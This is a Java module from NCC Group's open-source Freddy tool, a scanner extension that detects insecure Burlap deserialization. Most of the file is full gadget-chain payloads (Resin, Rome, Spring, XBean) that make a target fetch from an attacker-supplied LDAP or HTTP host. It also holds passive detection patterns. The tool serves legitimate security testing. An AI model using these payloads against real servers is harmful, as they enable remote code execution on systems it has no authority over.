// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java Burlap library.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BurlapModule extends FreddyModuleBase {
	//Resin payload data
	private static final String RESIN_PREFIX = "<map><type></type><map><type>com.caucho.naming.QName</type><string>_context</string><map><type>javax.naming.spi.ContinuationDirContext</type><string>cpe</string><map><type>javax.naming.CannotProceedException</type><string>rootException</string><null></null><string>detailMessage</string><null></null><string>cause</string><null></null><string>remainingNewName</string><null></null><string>environment</string><null></null><string>altName</string><null></null><string>altNameCtx</string><null></null><string>resolvedName</string><null></null><string>resolvedObj</string><map><type>javax.naming.Reference</type><string>className</string><string>Foo</string><string>classFactory</string><string>Freddy</string><string>classFactoryLocation</string><string>";
	private static final String RESIN_SUFFIX = "</string><string>addrs</string><list><type>java.util.Vector</type><length>0</length></list></map><string>remainingName</string><null></null><string>stackTrace</string><list><type>[java.lang.StackTraceElement</type><length>9</length><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>marshalsec.gadgets.Resin</string><string>methodName</string><string>makeResinQName</string><string>fileName</string><string>Resin.java</string><string>lineNumber</string><int>56</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>sun.reflect.NativeMethodAccessorImpl</string><string>methodName</string><string>invoke0</string><string>fileName</string><null></null><string>lineNumber</string><int>-2</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>sun.reflect.NativeMethodAccessorImpl</string><string>methodName</string><string>invoke</string><string>fileName</string><null></null><string>lineNumber</string><int>-1</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>sun.reflect.DelegatingMethodAccessorImpl</string><string>methodName</string><string>invoke</string><string>fileName</string><null></null><string>lineNumber</string><int>-1</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>java.lang.reflect.Method</string><string>methodName</string><string>invoke</string><string>fileName</string><null></null><string>lineNumber</string><int>-1</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>marshalsec.MarshallerBase</string><string>methodName</string><string>createObject</string><string>fileName</string><string>MarshallerBase.java</string><string>lineNumber</string><int>331</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>marshalsec.MarshallerBase</string><string>methodName</string><string>doRun</string><string>fileName</string><string>MarshallerBase.java</string><string>lineNumber</string><int>165</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>marshalsec.MarshallerBase</string><string>methodName</string><string>run</string><string>fileName</string><string>MarshallerBase.java</string><string>lineNumber</string><int>121</int></map><map><type>java.lang.StackTraceElement</type><string>declaringClass</string><string>marshalsec.Burlap</string><string>methodName</string><string>main</string><string>fileName</string><string>Burlap.java</string><string>lineNumber</string><int>64</int></map></list><string>suppressedExceptions</string><null></null></map><string>env</string><map><type>java.util.Hashtable</type></map><string>contCtx</string><null></null></map><string>_items</string><list><type></type><length>2</length><string>foo</string><string>bar</string></list></map><ref>1</ref><map><type>com.sun.org.apache.xpath.internal.objects.XString</type><string>m_obj</string><string>ë§¦...</string><string>m_parent</string><null></null></map><ref>18</ref></map>";
	
	//Rome payload data
	private static final String ROME_PREFIX = "<map><type></type><map><type>com.rometools.rome.feed.impl.EqualsBean</type><string>beanClass</string><map><type>java.lang.Class</type><string>name</string><string>com.rometools.rome.feed.impl.ToStringBean</string></map><string>obj</string><map><type>com.rometools.rome.feed.impl.ToStringBean</type><string>beanClass</string><map><type>java.lang.Class</type><string>name</string><string>com.sun.rowset.JdbcRowSetImpl</string></map><string>obj</string><map><type>com.sun.rowset.JdbcRowSetImpl</type><string>command</string><null></null><string>URL</string><null></null><string>dataSource</string><string>";
	private static final String ROME_SUFFIX = "</string><string>rowSetType</string><int>1004</int><string>showDeleted</string><boolean>0</boolean><string>queryTimeout</string><int>0</int><string>maxRows</string><int>0</int><string>maxFieldSize</string><int>0</int><string>concurrency</string><int>1008</int><string>readOnly</string><boolean>1</boolean><string>escapeProcessing</string><boolean>1</boolean><string>isolation</string><int>2</int><string>fetchDir</string><int>1000</int><string>fetchSize</string><int>0</int><string>conn</string><null></null><string>ps</string><null></null><string>rs</string><null></null><string>rowsMD</string><null></null><string>resMD</string><null></null><string>iMatchColumns</string><list><type>java.util.Vector</type><length>10</length><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int></list><string>strMatchColumns</string><list><type>java.util.Vector</type><length>10</length><string>foo</string><null></null><null></null><null></null><null></null><null></null><null></null><null></null><null></null><null></null></list><string>binaryStream</string><null></null><string>unicodeStream</string><null></null><string>asciiStream</string><null></null><string>charStream</string><null></null><string>map</string><null></null><string>listeners</string><null></null><string>params</string><map><type>java.util.Hashtable</type></map></map></map></map><ref>1</ref><ref>1</ref><ref>1</ref></map>";
	
	//SpringAbstractBeanFactoryPointcutAdvisor payload data
	private static final String SABF_PREFIX = "<map><type></type><map><type>org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</type><string>adviceBeanName</string><string>";
	private static final String SABF_MIDDLE = "</string><string>order</string><null></null><string>pointcut</string><map><type>org.springframework.aop.TruePointcut</type></map><string>beanFactory</string><map><type>org.springframework.jndi.support.SimpleJndiBeanFactory</type><string>resourceRef</string><boolean>1</boolean><string>shareableResources</string><list><type>java.util.HashSet</type><length>1</length><string>";
	private static final String SABF_SUFFIX = "</string></list><string>singletonObjects</string><map><type></type></map><string>resourceTypes</string><map><type></type></map><string>logger</string><map><type>org.apache.commons.logging.impl.NoOpLog</type></map><string>jndiTemplate</string><map><type>org.springframework.jndi.JndiTemplate</type><string>logger</string><map><type>org.apache.commons.logging.impl.NoOpLog</type></map><string>environment</string><null></null></map></map></map><ref>1</ref><map><type>org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</type><string>adviceBeanName</string><null></null><string>order</string><null></null><string>pointcut</string><ref>2</ref><string>beanFactory</string><null></null></map><ref>10</ref></map>";
	
	//SpringPartiallyComparableAdvisorHolder payload data
	private static final String SPCA_PREFIX = "<map><type></type><map><type>org.springframework.aop.target.HotSwappableTargetSource</type><string>target</string><map><type>org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</type><string>advisor</string><map><type>org.springframework.aop.aspectj.AspectJPointcutAdvisor</type><string>order</string><null></null><string>advice</string><map><type>org.springframework.aop.aspectj.AspectJAroundAdvice</type><string>declaringClass</string><map><type>java.lang.Class</type><string>name</string><string>java.lang.Object</string></map><string>methodName</string><string>toString</string><string>aspectName</string><null></null><string>declarationOrder</string><int>0</int><string>throwingName</string><null></null><string>returningName</string><null></null><string>discoveredReturningType</string><null></null><string>discoveredThrowingType</string><null></null><string>joinPointArgumentIndex</string><int>0</int><string>joinPointStaticPartArgumentIndex</string><int>0</int><string>argumentsIntrospected</string><boolean>0</boolean><string>discoveredReturningGenericType</string><null></null><string>parameterTypes</string><list><type>[java.lang.Class</type><length>0</length></list><string>pointcut</string><null></null><string>aspectInstanceFactory</string><map><type>org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory</type><string>name</string><string>";
	private static final String SPCA_MIDDLE = "</string><string>beanFactory</string><map><type>org.springframework.jndi.support.SimpleJndiBeanFactory</type><string>resourceRef</string><boolean>1</boolean><string>shareableResources</string><list><type>java.util.HashSet</type><length>1</length><string>";
	private static final String SPCA_SUFFIX = "</string></list><string>singletonObjects</string><map><type></type></map><string>resourceTypes</string><map><type></type></map><string>logger</string><map><type>org.apache.commons.logging.impl.NoOpLog</type></map><string>jndiTemplate</string><map><type>org.springframework.jndi.JndiTemplate</type><string>logger</string><map><type>org.apache.commons.logging.impl.NoOpLog</type></map><string>environment</string><null></null></map></map><string>aspectMetadata</string><null></null></map><string>argumentNames</string><null></null><string>argumentBindings</string><null></null></map><string>pointcut</string><null></null></map><string>comparator</string><null></null></map></map><ref>1</ref><map><type>org.springframework.aop.target.HotSwappableTargetSource</type><string>target</string><map><type>com.sun.org.apache.xpath.internal.objects.XString</type><string>m_obj</string><string>á¦¥...</string><string>m_parent</string><null></null></map></map><ref>15</ref></map>";
	
	//XBean payload data
	private static final String XBEAN_PREFIX = "<map><type></type><map><type>org.springframework.aop.target.HotSwappableTargetSource</type><string>target</string><map><type>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</type><string>isRelative</string><boolean>0</boolean><string>name</string><string>foo</string><string>className</string><null></null><string>fullName</string><null></null><string>isRel</string><boolean>1</boolean><string>value</string><map><type>javax.naming.Reference</type><string>className</string><string>foo</string><string>classFactory</string><string>Freddy</string><string>classFactoryLocation</string><string>";
	private static final String XBEAN_SUFFIX = "</string><string>addrs</string><list><type>java.util.Vector</type><length>0</length></list></map><string>context</string><map><type>org.apache.xbean.naming.context.WritableContext</type><string>cacheReferences</string><boolean>0</boolean><string>supportReferenceable</string><boolean>0</boolean><string>checkDereferenceDifferent</string><boolean>0</boolean><string>assumeDereferenceBound</string><boolean>0</boolean><string>nameInNamespace</string><null></null><string>modifiable</string><boolean>0</boolean><string>inCall</string><null></null><string>writeLock</string><null></null><string>bindingsRef</string><null></null><string>indexRef</string><null></null><string>contextFederation</string><null></null><string>masterContext</string><null></null><string>parsedNameInNamespace</string><null></null><string>contextAccess</string><null></null></map><string>boundObj</string><ref>3</ref></map></map><ref>1</ref><map><type>org.springframework.aop.target.HotSwappableTargetSource</type><string>target</string><map><type>com.sun.org.apache.xpath.internal.objects.XString</type><string>m_obj</string><string>ï¯¶...</string><string>m_parent</string><null></null></map></map><ref>6</ref></map>";
	
	protected void initialiseModule() {
		setName("Burlap");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Register passive/active scan payloads
		registerPassiveScanIndicator(Pattern.compile("((<)|(%3C)|(%3c))map((>)|(%3E)|(%3e))((<)|(%3C)|(%3c))type((>)|(%3E)|(%3e))"), IndicatorTarget.REQUEST);
		registerPassiveScanIndicator("com.caucho.burlap.io.BurlapProtocolException", IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload("<FreddyDeser></FreddyDeser>", Pattern.compile("Unknown tag ((<)|(&lt;))FreddyDeser((>)|(&gt;))"));
		
		registerActiveScanCollaboratorPayload(PN_RESIN, false);
		registerActiveScanCollaboratorPayload(PN_ROME, false);
		registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
		registerActiveScanCollaboratorPayload(PN_SPRINGPCA, false);
		registerActiveScanCollaboratorPayload(PN_XBEAN, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_RESIN:
				return RESIN_PREFIX + "http://" + hostname + "/" + RESIN_SUFFIX;
				
			case PN_ROME:
				return ROME_PREFIX + "ldap://" + hostname + "/" + ROME_SUFFIX;
				
			case PN_SPRINGABF:
				return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;
				
			case PN_SPRINGPCA:
				return SPCA_PREFIX + "ldap://" + hostname + "/" + SPCA_MIDDLE + "ldap://" + hostname + "/" + SPCA_SUFFIX;
				
			case PN_XBEAN:
				return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
		}
		return null;
	}
}
